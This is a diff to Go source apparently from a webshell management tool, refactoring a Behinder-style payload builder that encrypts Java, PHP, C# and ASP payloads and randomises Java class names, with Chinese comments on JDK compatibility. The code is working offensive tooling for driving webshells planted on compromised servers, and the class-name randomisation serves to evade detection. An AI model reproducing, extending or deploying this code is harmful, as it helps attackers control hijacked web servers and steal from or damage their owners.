@@ -2,7 +2,7 @@ package behinder
 
 import (
 	"encoding/base64"
-	"encoding/hex"
+	"errors"
 	"fmt"
 	"github.com/Go0p/wsm/lib/dynamic"
 	"github.com/Go0p/wsm/lib/payloads"
@@ -12,15 +12,18 @@ import (
 	"strings"
 )
 
-func GetData(key []byte, className string, params map[string]string, types shell.ScriptType, encryptType int) string {
+func GetPayload(key []byte, className string, params map[string]string, types shell.ScriptType, encryptType int) ([]byte, error) {
 	var bincls []byte
 	if types == shell.JavaScript {
 		bincls = getParamedClass(className, params)
 		//if (extraData != null) {
 		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
 		//}
-		encrypedBincls := encryptForJava(bincls, key)
-		return base64.StdEncoding.EncodeToString(encrypedBincls)
+		encrypedBincls, err := encryptForJava(bincls, key)
+		if err != nil {
+			return nil, err
+		}
+		return []byte(base64.StdEncoding.EncodeToString(encrypedBincls)), nil
 	} else if types == shell.PhpScript {
 		bincls = getParamedPhp(className, params)
 		bincls = []byte(base64.StdEncoding.EncodeToString(bincls))
@@ -29,17 +32,21 @@ func GetData(key []byte, className string, params map[string]string, types shell
 		//if extraData != null {
 		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
 		//}
-		encrypedBincls := encryptForPhp(bincls, key, encryptType)
-		fmt.Println(base64.StdEncoding.EncodeToString(encrypedBincls))
-		fmt.Println(len(base64.StdEncoding.EncodeToString(encrypedBincls)))
-		return base64.StdEncoding.EncodeToString(encrypedBincls)
+		encrypedBincls, err := encryptForPhp(bincls, key, encryptType)
+		if err != nil {
+			return nil, err
+		}
+		return []byte(base64.StdEncoding.EncodeToString(encrypedBincls)), nil
 	} else if types == shell.CsharpScript {
 		bincls = GetParamedAssembly(className, params)
 		//if (extraData != null) {
 		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
 		//}
-		encrypedBincls := encryptForCSharp(bincls, key)
-		return string(encrypedBincls)
+		encrypedBincls, err := encryptForCSharp(bincls, key)
+		if err != nil {
+			return nil, err
+		}
+		return encrypedBincls, nil
 	} else if types == shell.AspScript {
 		bincls = GetParamedAsp(className, params)
 		//if (extraData != null) {
@@ -47,10 +54,9 @@ func GetData(key []byte, className string, params map[string]string, types shell
 		//}
 		//fmt.Println(hex.EncodeToString(encryptForAsp(bincls, key)))
 		xx := encryptForAsp(bincls, key)
-		fmt.Println("encode : ", hex.EncodeToString(xx))
-		return string(xx)
+		return xx, nil
 	} else {
-		return ""
+		return nil, errors.New(fmt.Sprintf("get %s payload error", types))
 	}
 }
 
@@ -66,7 +72,6 @@ func getParamedClass(clsName string, params map[string]string) []byte {
 	oldClassName := fmt.Sprintf("net/behinder/payload/java/%s", clsName)
 	if clsName != "LoadNativeLibraryGo" {
 		newClassName := dynamic.RandomClassName()
-		fmt.Println("随机包名Class :", newClassName)
 		result = dynamic.ReplaceClassName(result, oldClassName, newClassName)
 	}
 	// 修改为Jdk 1.5 冰蝎原版是 50(1.6),测了几下发现 49(1.5) 也行，不知道有没有 bug
@@ -94,9 +99,7 @@ func getParamedPhp(clsName string, params map[string]string) []byte {
 	code.WriteString(string(payloadBytes))
 	paraList := ""
 	paramsList := getPhpParams(payloadBytes)
-	fmt.Println(paramsList)
 	for _, paraName := range paramsList {
-		fmt.Println("paraName----", paraName)
 		if dynamic.InStrSlice(keySet(params), paraName) {
 			paraValue := params[paraName]
 			paraValue = base64.StdEncoding.EncodeToString([]byte(paraValue))
